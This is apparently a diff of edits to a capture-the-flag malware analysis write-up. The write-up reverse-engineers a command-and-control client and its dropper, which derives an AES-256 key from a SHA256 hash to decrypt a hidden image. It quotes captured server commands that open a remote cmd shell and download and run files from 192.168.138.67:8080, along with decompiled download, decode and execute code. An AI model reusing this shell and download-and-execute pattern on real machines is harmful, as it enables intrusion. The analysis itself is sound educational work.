-DKEYEXCH|ENCRYPTTRAFFIK07
-HEL|C:\windows\system32\cmd.exe
+<server> KEYEXCH|ENCRYPTTRAFFIK07
+<server> CMDSHEL|C:\windows\system32\cmd.exe
 <client>
 Microsoft Windows [Version 10.0.19044.1645]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Users\saura\data>
 
-<server> CMD|cd %temp%
+<server> EXECCMD|cd %temp%
 <client> cd %temp%
 
 <client> C:\Users\saura\AppData\Local\Temp>
-<server> ???
-<server> EXEC|http://192.168.138.67:8080/data.png|DEKRYPT|0
-<server> EXEC|http://192.168.138.67:8080/data.txt|DEKRYPT|1
+<server> EXITSHEL
+<server> DOWNEXEC|http://192.168.138.67:8080/data.png|DEKRYPT|0
+<server> DOWNEXEC|http://192.168.138.67:8080/data.txt|DEKRYPT|1
 ```
 
-The server called commands `HEL`, `CMD` (and one command that didn't want to decrypt), to change into the users temp folder. Then it called twice `EXEC` with the server ip plus `data.png` and `data.txt`. Lets go back to the executable and check what the function is doing there. Interesting enough, `EXEC` doesn't map to one of the hardcoded server command hashes, so we end up all the way down in the `else clause`.
+The server called `CMDSHEL` to spawn a new command shell on the client and `EXECCMD` to run the shell command `cd %temp%` to let the client change to the users temp directory. Then the server closes the shell with calling `EXITSHEL`.
+
+Finally the server called twice `DOWNEXEC` with the server ip plus `data.png` and `data.txt`. Lets go back to the executable and check what the function is doing there. Interesting enough, `DOWNEXEC` doesn't map to one of the hardcoded server command hashes, so we end up all the way down in the `else clause`.
 
 ```c
 /// ...
-1400025b5                    else
-1400025b5                    {
-1400025c2                        char* rax_13 = strtok_s(nullptr, &_Delimiter, &_Context);
-1400025df                        int32_t rax_15 = StrToIntA(strtok_s(nullptr, &_Delimiter, &_Context));
-140002603                        result = sub_140002890(Concurrency::details::UMSThreadProxy::InternalSwitchTo(lpBuffer), Concurrency::details::UMSThreadProxy::InternalSwitchTo(rax_13), rax_15);
-1400025b5                    }
+1400025b5    else
+1400025b5    {
+1400025c2        char* rax_13 = strtok_s(nullptr, &_Delimiter, &_Context);
+1400025df        int32_t rax_15 = StrToIntA(strtok_s(nullptr, &_Delimiter, &_Context));
+140002603        result = sub_140002890(Concurrency::details::UMSThreadProxy::InternalSwitchTo(lpBuffer), Concurrency::details::UMSThreadProxy::InternalSwitchTo(rax_13), rax_15);
+1400025b5    }
 /// ...
 ```
 
-We can see it tokenizes twice again. In `rax_13` in both cases `DEKRYPT` is stored, in `rax_15` the token is converted to an integer: for data.png `0` and for data.txt `1`. Then function `sub_140002890` is called with both parameters and the original first parameter (the url). Again, the function is rather length.
+We can see it tokenizes twice again. In `rax_13` in both cases `DEKRYPT` is stored, in `rax_15` the token is converted to an integer: for `data.png 0` and for `data.txt 1`. Then function `sub_140002890` is called with both parameters and the original first parameter (the url). Again, the function is rather lengthy.
 
-The first part is rather boring. There is a lot of code that does a web request to the passed url and writes the result into a temporary file:
+The first part not too interesting. There is a lot of code that does sends of a web request to the url and writes the result of the request into a temporary file:
 
 ```c
 /// ...
@@ -905,130 +945,130 @@ The first part is rather boring. There is a lot of code that does a web request 
 
 ```
 
-Next up the  file is read again and converted from base64 and written again to the same file. 
+Next up the  file is read again, converted from base64 and written again to the same file. 
 
 ```c
-140002b5c                            var_eb8_2 = 0;
-140002b84                            HANDLE rax_7 = CreateFileW(&var_d68, 0x80000000, i + 1, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, var_eb8_2);
-140002b84                            
-140002b90                            if (rax_7 != -1)
-140002b90                            {
-140002b9b                                uint32_t nNumberOfBytesToRead = GetFileSize(rax_7, nullptr);
-140002ba6                                uint8_t* lpBuffer_1 = malloc((uint64_t)nNumberOfBytesToRead);
-140002bb7                                memset(lpBuffer_1, 0, (uint64_t)nNumberOfBytesToRead);
-140002bc5                                uint32_t lpNumberOfBytesRead = 0;
-140002bcb                                enum FILE_CREATION_DISPOSITION lpOverlapped_1;
-140002bcb                                lpOverlapped_1 = 0;
-140002bcb                                
-140002bdb                                if (ReadFile(rax_7, lpBuffer_1, nNumberOfBytesToRead, &lpNumberOfBytesRead, lpOverlapped_1))
-140002bdb                                {
-140002be4                                    CloseHandle(rax_7);
-140002be4                                    
-140002bee                                    if (lpNumberOfBytesRead == nNumberOfBytesToRead)
-140002bee                                    {
-140002bf4                                        var_eb8_2 = 0;
-140002bfe                                        enum FILE_FLAGS_AND_ATTRIBUTES var_ec0_2;
-140002bfe                                        var_ec0_2 = 0;
-140002c0a                                        uint32_t nNumberOfBytesToWrite_1;
-140002c0a                                        lpOverlapped_1 = &nNumberOfBytesToWrite_1;
-140002c12                                        nNumberOfBytesToWrite_1 = 0;
-140002c12                                        
-140002c21                                        if (CryptStringToBinaryA(lpBuffer_1, (uint64_t)nNumberOfBytesToRead, 1, 0, lpOverlapped_1, var_ec0_2, var_eb8_2))
-140002c21                                        {
-140002c2b                                            uint8_t* lpBuffer_2 = malloc((uint64_t)nNumberOfBytesToWrite_1);
-140002c3e                                            memset(lpBuffer_2, 0, (uint64_t)nNumberOfBytesToWrite_1);
-140002c48                                            var_eb8_2 = 0;
-140002c4d                                            var_ec0_2 = 0;
-140002c59                                            lpOverlapped_1 = &nNumberOfBytesToWrite_1;
-140002c59                                            
-140002c6c                                            if (CryptStringToBinaryA(lpBuffer_1, (uint64_t)nNumberOfBytesToRead, 1, lpBuffer_2, lpOverlapped_1, var_ec0_2, var_eb8_2))
-140002c6c                                            {
-140002c72                                                var_eb8_2 = 0;
-140002c9a                                                HANDLE rax_11 = CreateFileW(&var_d68, 0x40000000, FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, var_eb8_2);
-140002c9a                                                
-140002ca6                                                if (rax_11 != -1)
-140002ca6                                                {
-140002cac                                                    uint32_t nNumberOfBytesToWrite = nNumberOfBytesToWrite_1;
-140002cbe                                                    uint32_t lpNumberOfBytesWritten = 0;
-140002cc2                                                    enum FILE_CREATION_DISPOSITION lpOverlapped_2;
-140002cc2                                                    lpOverlapped_2 = 0;
-140002cc2                                                    
-140002ccf                                                    if (WriteFile(rax_11, lpBuffer_2, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped_2))
-140002ccf                                                    {
-140002cd8                                                        CloseHandle(rax_11);
+140002b5c    var_eb8_2 = 0;
+140002b84    HANDLE rax_7 = CreateFileW(&var_d68, 0x80000000, i + 1, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, var_eb8_2);
+140002b84    
+140002b90    if (rax_7 != -1)
+140002b90    {
+140002b9b        uint32_t nNumberOfBytesToRead = GetFileSize(rax_7, nullptr);
+140002ba6        uint8_t* lpBuffer_1 = malloc((uint64_t)nNumberOfBytesToRead);
+140002bb7        memset(lpBuffer_1, 0, (uint64_t)nNumberOfBytesToRead);
+140002bc5        uint32_t lpNumberOfBytesRead = 0;
+140002bcb        enum FILE_CREATION_DISPOSITION lpOverlapped_1;
+140002bcb        lpOverlapped_1 = 0;
+140002bcb        
+140002bdb        if (ReadFile(rax_7, lpBuffer_1, nNumberOfBytesToRead, &lpNumberOfBytesRead, lpOverlapped_1))
+140002bdb        {
+140002be4            CloseHandle(rax_7);
+140002be4            
+140002bee            if (lpNumberOfBytesRead == nNumberOfBytesToRead)
+140002bee            {
+140002bf4                var_eb8_2 = 0;
+140002bfe                enum FILE_FLAGS_AND_ATTRIBUTES var_ec0_2;
+140002bfe                var_ec0_2 = 0;
+140002c0a                uint32_t nNumberOfBytesToWrite_1;
+140002c0a                lpOverlapped_1 = &nNumberOfBytesToWrite_1;
+140002c12                nNumberOfBytesToWrite_1 = 0;
+140002c12                
+140002c21                if (CryptStringToBinaryA(lpBuffer_1, (uint64_t)nNumberOfBytesToRead, 1, 0, lpOverlapped_1, var_ec0_2, var_eb8_2))
+140002c21                {
+140002c2b                    uint8_t* lpBuffer_2 = malloc((uint64_t)nNumberOfBytesToWrite_1);
+140002c3e                    memset(lpBuffer_2, 0, (uint64_t)nNumberOfBytesToWrite_1);
+140002c48                    var_eb8_2 = 0;
+140002c4d                    var_ec0_2 = 0;
+140002c59                    lpOverlapped_1 = &nNumberOfBytesToWrite_1;
+140002c59                    
+140002c6c                    if (CryptStringToBinaryA(lpBuffer_1, (uint64_t)nNumberOfBytesToRead, 1, lpBuffer_2, lpOverlapped_1, var_ec0_2, var_eb8_2))
+140002c6c                    {
+140002c72                        var_eb8_2 = 0;
+140002c9a                        HANDLE rax_11 = CreateFileW(&var_d68, 0x40000000, FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, var_eb8_2);
+140002c9a                        
+140002ca6                        if (rax_11 != -1)
+140002ca6                        {
+140002cac                            uint32_t nNumberOfBytesToWrite = nNumberOfBytesToWrite_1;
+140002cbe                            uint32_t lpNumberOfBytesWritten = 0;
+140002cc2                            enum FILE_CREATION_DISPOSITION lpOverlapped_2;
+140002cc2                            lpOverlapped_2 = 0;
+140002cc2                            
+140002ccf                            if (WriteFile(rax_11, lpBuffer_2, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped_2))
+140002ccf                            {
+140002cd8                                CloseHandle(rax_11);
 /// ...
-140002bdb                                
-140002e3e                                hInternet_2 = hConnect;
-140002b90                            }
+140002bdb        
+140002e3e        hInternet_2 = hConnect;
+140002b90    }
 ```
 
-The last part creates a new process that runs the file **if** `arg3` is set and passes in `arg2` as commandline argument. Both parameters are coming from the command, remember `arg3` one time was set to `0` and the second time to `1` whereas `arg2` was set to `DEKRYPT` in both cases.
+The last part creates a new process that runs the file **if** `arg3` is set to `true` and passes in `arg2` as commandline argument. Both parameters are coming from the command, remember `arg3` one time was set to `0` and the second time to `1` whereas `arg2` was set to `DEKRYPT` in both cases.
 
 ```c
-140002cf0                                                        if (lpNumberOfBytesWritten == nNumberOfBytesToWrite_1 && arg3)
-140002cf0                                                        {
-140002cf9                                                            int32_t lpStartupInfo = 0x68;
-140002d09                                                            int64_t rax_14 = -1;
-140002d0c                                                            int128_t s;
-140002d0c                                                            __builtin_memset(&s, 0, 0x64);
-140002d24                                                            int128_t var_e08;
-140002d24                                                            __builtin_memset(&var_e08, 0, 0x18);
-140002d24                                                            
-140002d38                                                            do
-140002d30                                                                rax_14 += 1;
-140002d38                                                             while (*(uint16_t*)(arg2 + (rax_14 << 1)));
-140002d38                                                            
-140002d41                                                            int64_t rcx_27 = -1;
-140002d41                                                            
-140002d4c                                                            do
-140002d44                                                                rcx_27 += 1;
-140002d4c                                                             while (*(uint16_t*)(&var_d68 + (rcx_27 << 1)));
-140002d4c                                                            
-140002d5d                                                            PWSTR lpCommandLine = malloc((uint64_t)((int32_t)((rax_14 + rcx_27) << 1) + 4));
-140002d6e                                                            memset(lpCommandLine, 0, (uint64_t)((int32_t)((rax_14 + rcx_27) << 1) + 4));
-140002d7a                                                            int64_t r8_9 = -1;
-140002d7a                                                            
-140002d88                                                            do
-140002d80                                                                r8_9 += 1;
-140002d88                                                             while (*(uint16_t*)(&var_d68 + (r8_9 << 1)));
-140002d88                                                            
-140002d97                                                            memcpy(lpCommandLine, &var_d68, r8_9 * 2);
-140002da3                                                            int64_t rax_17 = -1;
-140002dba                                                            void var_d66;
-140002dba                                                            bool cond:1_1;
-140002dba                                                            
-140002dba                                                            do
-140002dba                                                            {
-140002db0                                                                cond:1_1 = *(uint16_t*)(&var_d66 + (rax_17 << 1));
-140002db6                                                                rax_17 += 1;
-140002dba                                                            } while (cond:1_1);
-140002dc1                                                            int64_t r8_11 = -1;
-140002dc4                                                            lpCommandLine[rax_17] = 0x20;
-140002dc4                                                            
-140002dd8                                                            do
-140002dd0                                                                r8_11 += 1;
-140002dd8                                                             while (*(uint16_t*)(arg2 + (r8_11 << 1)));
-140002dd8                                                            
-140002dee                                                            bool cond:2_1;
-140002dee                                                            
-140002dee                                                            do
-140002dee                                                            {
-140002de4                                                                cond:2_1 = *(uint16_t*)(&var_d66 + (rdi << 1));
-140002dea                                                                rdi += 1;
-140002dee                                                            } while (cond:2_1);
-140002dfb                                                            memcpy(&lpCommandLine[rdi + 1], arg2, r8_11 * 2);
-140002e29                                                            var_eb8_2 = 0;
-140002e38                                                            CreateProcessW(nullptr, lpCommandLine, nullptr, nullptr, 0, 0, var_eb8_2, &var_b58, &lpStartupInfo, &var_e08);
-140002cf0                                                        }
-140002ccf                                                    }
-140002ca6                                                }
-140002c6c                                            }
-140002c21                                        }
-140002bee                                    }
-140002bdb                                }
+140002cf0                            if (lpNumberOfBytesWritten == nNumberOfBytesToWrite_1 && arg3)
+140002cf0                            {
+140002cf9                                int32_t lpStartupInfo = 0x68;
+140002d09                                int64_t rax_14 = -1;
+140002d0c                                int128_t s;
+140002d0c                                __builtin_memset(&s, 0, 0x64);
+140002d24                                int128_t var_e08;
+140002d24                                __builtin_memset(&var_e08, 0, 0x18);
+140002d24                                
+140002d38                                do
+140002d30                                    rax_14 += 1;
+140002d38                                 while (*(uint16_t*)(arg2 + (rax_14 << 1)));
+140002d38                                
+140002d41                                int64_t rcx_27 = -1;
+140002d41                                
+140002d4c                                do
+140002d44                                    rcx_27 += 1;
+140002d4c                                 while (*(uint16_t*)(&var_d68 + (rcx_27 << 1)));
+140002d4c                                
+140002d5d                                PWSTR lpCommandLine = malloc((uint64_t)((int32_t)((rax_14 + rcx_27) << 1) + 4));
+140002d6e                                memset(lpCommandLine, 0, (uint64_t)((int32_t)((rax_14 + rcx_27) << 1) + 4));
+140002d7a                                int64_t r8_9 = -1;
+140002d7a                                
+140002d88                                do
+140002d80                                    r8_9 += 1;
+140002d88                                 while (*(uint16_t*)(&var_d68 + (r8_9 << 1)));
+140002d88                                
+140002d97                                memcpy(lpCommandLine, &var_d68, r8_9 * 2);
+140002da3                                int64_t rax_17 = -1;
+140002dba                                void var_d66;
+140002dba                                bool cond:1_1;
+140002dba                                
+140002dba                                do
+140002dba                                {
+140002db0                                    cond:1_1 = *(uint16_t*)(&var_d66 + (rax_17 << 1));
+140002db6                                    rax_17 += 1;
+140002dba                                } while (cond:1_1);
+140002dc1                                int64_t r8_11 = -1;
+140002dc4                                lpCommandLine[rax_17] = 0x20;
+140002dc4                                
+140002dd8                                do
+140002dd0                                    r8_11 += 1;
+140002dd8                                 while (*(uint16_t*)(arg2 + (r8_11 << 1)));
+140002dd8                                
+140002dee                                bool cond:2_1;
+140002dee                                
+140002dee                                do
+140002dee                                {
+140002de4                                    cond:2_1 = *(uint16_t*)(&var_d66 + (rdi << 1));
+140002dea                                    rdi += 1;
+140002dee                                } while (cond:2_1);
+140002dfb                                memcpy(&lpCommandLine[rdi + 1], arg2, r8_11 * 2);
+140002e29                                var_eb8_2 = 0;
+140002e38                                CreateProcessW(nullptr, lpCommandLine, nullptr, nullptr, 0, 0, var_eb8_2, &var_b58, &lpStartupInfo, &var_e08);
+140002cf0                            }
+140002ccf                        }
+140002ca6                    }
+140002c6c                }
+140002c21            }
+140002bee        }
+140002bdb    }
 ```
 
-Alright, we know what the server is doing. It downloads files from itself via a http request to the client. Decodes the files (which are incomming as base64 encoded blobs) and runs one of the files with command line arguments `DEKRYPT`.
+Alright, we know what the server is doing. It downloads files through a web-server running on the server itself and drops them in the clients `temp` directory; decodes the files (which are incomming as base64 encoded blobs) and runs one of the files with command line arguments `DEKRYPT`.
 
 Lets go back to the network traffic capture and see if we can find the download commands.
 
@@ -1038,9 +1078,9 @@ Lets go back to the network traffic capture and see if we can find the download 
 ...
 ```
 
-We can extract the data by following the TCP streams for both requests: [`data.png`](request1.txt), [`data.txt`](request2.txt). Both files come base64 encoded, we can just decode both files. The `png` file is not a png file at all, but the `data.txt` file is actually a executable. So lets open this file in BinaryNinja.
+We can extract the data by *following the TCP streams* for both requests: [`data.png`](request1.txt), [`data.txt`](request2.txt). Both files come base64 encoded, so we have to decode them first. As it turns out, `png` file is not a png file at all, but the `data.txt` file is actually a executable (PE). So lets open this file in BinaryNinja for further analysis.
 
-The main function converts the (second) input argument to a utf-16 string and ten calls `sub_140001260` on the string.
+The main function converts the (second) input argument to an utf-16 string and then calls function `sub_140001260` on the string.
 
 ```c
 140001000    int64_t main(int32_t arg1, void* arg2)
@@ -1065,7 +1105,7 @@ The main function converts the (second) input argument to a utf-16 string and te
 140001000    }
 ```
 
-Function `sub_140001260` is also not very complicated. The function creates a `sha256` hash of our commandline argument (`DEKRYPT`). We know that it's a sha256 hash because the second parameter of [`CryptCreateHash`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash) is `0x800c` which corresponds to `CALG_SHA_256`. 
+Function `sub_140001260` is also not too complicated. The function creates a `SHA256` hash of our commandline argument (`DEKRYPT`). We know that it's a SHA256 hash because the second parameter of [`CryptCreateHash`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash) is `0x800c` which corresponds to `CALG_SHA_256`. 
 
 ```c
 140001260    BOOL sub_140001260(char* arg1)
@@ -1139,61 +1179,62 @@ Function `sub_140001260` is also not very complicated. The function creates a `s
 140001260    }
 ```
 
-Lastely the has is imported as `aes-256` key by calling [`CryptImportKey`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey). We know the algorithm because `0x6610` is filled to the `PUBLICKEYSTRUC` structs `aiKeyAlg` field that corresponds to `CALG_AES_256`.
+Lastely the hash is imported as `AES-256` key by calling [`CryptImportKey`](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptimportkey). We know the algorithm because `0x6610` is filled to the `PUBLICKEYSTRUC` structs `aiKeyAlg` field that corresponds to `CALG_AES_256`.
 
 ```c
 /// ...
-140001426                                void var_248;
-140001426                                GetTempPathW(0x104, &var_248);
-140001438                                lstrcatW(&var_248, u"data.png");
-140001448                                uint64_t* var_290_1;
-140001448                                var_290_1 = 0x80;
-140001463                                HANDLE hFile = CreateFileW(&var_248, 0xc0000000, FILE_SHARE_NONE, nullptr, OPEN_EXISTING, var_290_1, nullptr);
-140001463                                
-14000146f                                if (hFile != -1)
-14000146f                                {
-140001495                                    uint64_t r15_1 = (uint64_t)GetFileSize(hFile, nullptr);
-140001498                                    uint8_t* lpBuffer = malloc(0x10);
-1400014a1                                    lpNumberOfBytesRead = 0;
-1400014a9                                    uint32_t count = 0;
-1400014b3                                    void* rax_8 = malloc((uint64_t)r15_1);
-1400014c1                                    void* rsi_1 = rax_8;
-1400014c4                                    memset(rax_8, 0, (uint64_t)r15_1);
-1400014c4                                    
-140001544                                    for (BOOL Final = 0; !Final; )
-140001544                                    {
-1400014d5                                        enum FILE_CREATION_DISPOSITION var_298_4;
-1400014d5                                        var_298_4 = 0;
-1400014eb                                        *(uint128_t*)lpBuffer = {0};
-1400014ee                                        ReadFile(hFile, lpBuffer, 0x10, &lpNumberOfBytesRead, var_298_4);
-1400014fe                                        uint64_t hKey = hKey_1;
-1400014fe                                        
-140001503                                        if (lpNumberOfBytesRead < 0x10)
-140001503                                            Final = 1;
-140001503                                        
-140001507                                        uint32_t* pdwDataLen = &count;
-14000150f                                        count = 0x10;
-14000151a                                        var_298_4 = lpBuffer;
-14000151a                                        
-140001529                                        if (CryptDecrypt(hKey, 0, Final, 0, var_298_4, pdwDataLen))
-140001529                                        {
-140001536                                            memcpy(rsi_1, lpBuffer, count);
-14000153f                                            rsi_1 += (uint64_t)count;
-140001529                                        }
-140001544                                    }
-140001544                                    
-14000154a                                    uint32_t count_1 = r15_1 - (int32_t)*(uint8_t*)((char*)rsi_1 - 1);
-140001550                                    uint8_t* rax_12 = malloc((uint64_t)count_1);
-140001561                                    memset(rax_12, 0, (uint64_t)count_1);
-140001574                                    memcpy(rax_12, (char*)rsi_1 - r15_1, count_1);
-14000157f                                    sub_1400010e0(rax_12, count_1);
-14000146f                                }
-14000146f                                
-140001599                                CryptDestroyKey(hKey_1);
+140001426    void var_248;
+140001426    GetTempPathW(0x104, &var_248);
+140001438    lstrcatW(&var_248, u"data.png");
+140001448    uint64_t* var_290_1;
+140001448    var_290_1 = 0x80;
+140001463    HANDLE hFile = CreateFileW(&var_248, 0xc0000000, FILE_SHARE_NONE, nullptr, OPEN_EXISTING, var_290_1, nullptr);
+140001463    
+14000146f    if (hFile != -1)
+14000146f    {
+140001495        uint64_t r15_1 = (uint64_t)GetFileSize(hFile, nullptr);
+140001498        uint8_t* lpBuffer = malloc(0x10);
+1400014a1        lpNumberOfBytesRead = 0;
+1400014a9        uint32_t count = 0;
+1400014b3        void* rax_8 = malloc((uint64_t)r15_1);
+1400014c1        void* rsi_1 = rax_8;
+1400014c4        memset(rax_8, 0, (uint64_t)r15_1);
+1400014c4        
+140001544        for (BOOL Final = 0; !Final; )
+140001544        {
+1400014d5            enum FILE_CREATION_DISPOSITION var_298_4;
+1400014d5            var_298_4 = 0;
+1400014eb            *(uint128_t*)lpBuffer = {0};
+1400014ee            ReadFile(hFile, lpBuffer, 0x10, &lpNumberOfBytesRead, var_298_4);
+1400014fe            uint64_t hKey = hKey_1;
+1400014fe            
+140001503            if (lpNumberOfBytesRead < 0x10)
+140001503                Final = 1;
+140001503            
+140001507            uint32_t* pdwDataLen = &count;
+14000150f            count = 0x10;
+14000151a            var_298_4 = lpBuffer;
+14000151a            
+140001529            if (CryptDecrypt(hKey, 0, Final, 0, var_298_4, pdwDataLen))
+140001529            {
+140001536                memcpy(rsi_1, lpBuffer, count);
+14000153f                rsi_1 += (uint64_t)count;
+140001529            }
+140001544        }
+140001544        
+14000154a        uint32_t count_1 = r15_1 - (int32_t)*(uint8_t*)((char*)rsi_1 - 1);
+140001550        uint8_t* rax_12 = malloc((uint64_t)count_1);
+140001561        memset(rax_12, 0, (uint64_t)count_1);
+140001574        memcpy(rax_12, (char*)rsi_1 - r15_1, count_1);
+14000157f        sub_1400010e0(rax_12, count_1);
+14000146f    }
+14000146f    
+140001599    CryptDestroyKey(hKey_1);
 /// ...
 ```
 
-The remaining part loads the content of `%temp%\data.png`, creates a copy (and leaks some memory) and decrypts the file in 16 byte blocks. 
+The remaining part loads the content of `%temp%\data.png`, creates a copy (leaks some memory) and decrypts the file in 16 byte blocks.
+
 ```c
 1400010e0    BOOL sub_1400010e0(uint8_t* arg1, uint32_t arg2)
 
@@ -1247,7 +1288,7 @@ Theres one more function. Function `sub_1400010e0` is called after the file was 
 
 So this tool decrypts the image but doesn't save it anywhere. There are multiple ways of course to get to the image. One is to reimplement the logic, which should be fairly easy. But we can also just use the tool and run it within a debugger.
 
-First we need to find where to set a good breakpoint. One good point would be at `14000157f` where the validation function is called. We know that the buffer is in `rdi` or `rcx`. 
+First we need to find where to set a good breakpoint. One good point would be at `14000157f` where the validation function is called. We know that the buffer address is in `rdi` or `rcx`. 
 
 ```c
 140001550  ff15421c0000       call    qword [rel malloc]
@@ -1279,7 +1320,7 @@ Now we have the base address, we can add the relative offset of where we want to
 
 ![](img002.png)
 
-As we know which parameters point to the memory location with our decoded buffer `rax, rdi and rcx` (`0x1654276A470`) right before the function call, we can just grab the address from the registers. Also we know the buffer size is in `rdx, r15d` (`0x833`).
+As we know which registers point to the memory location with the decoded buffer (that is `rax, rdi and rcx` which all contain `0x1654276A470`) right before the function call, we can just grab the address from the registers. Also we know the buffer size is in `rdx, r15d` (`0x833`).
 
 ![](img003.png)
 
